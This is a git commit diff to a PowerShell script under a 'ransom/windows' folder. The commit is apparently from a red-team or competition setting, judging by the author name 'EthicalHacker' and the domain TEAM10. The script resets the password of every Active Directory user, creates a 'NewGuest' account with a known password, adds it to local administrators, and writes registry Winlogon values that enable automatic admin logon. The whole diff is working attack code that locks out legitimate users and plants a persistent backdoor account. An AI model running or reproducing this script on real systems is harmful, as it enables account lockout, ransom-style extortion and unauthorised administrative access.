6e5c8b2a5de8018572726f128e24e0f2a849984f
6903-EthicalHacker <44905220+6903-EthicalHacker@users.noreply.github.com>
2018-11-28 12:02:43 -0800

    Added new user creation, and auto login commands to script.

--- ransom/windows/service.ps1
+++ ransom/windows/service.ps1
@@ -1,1 +1,9 @@
-Get-ADUser -filter * | Set-ADAccountPassword -Reset -NewPassword(ConvertTo-SecureText “super_Secure_R!ght?” -asPlainText -Force)
+Get-ADUser -filter * | Set-ADAccountPassword -Reset -NewPassword(ConvertTo-SecureString "super_Secure_R!ght???" -asPlainText -Force)
+New-ADUser "NewGuest" -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) -Enabled $True
+net localgroup administrators /add TEAM10\NewGuest
+$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+$DefaultUsername = "NewGuest"
+$DefaultPassword = "P@ssw0rd!"
+Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
+Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String 
+Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
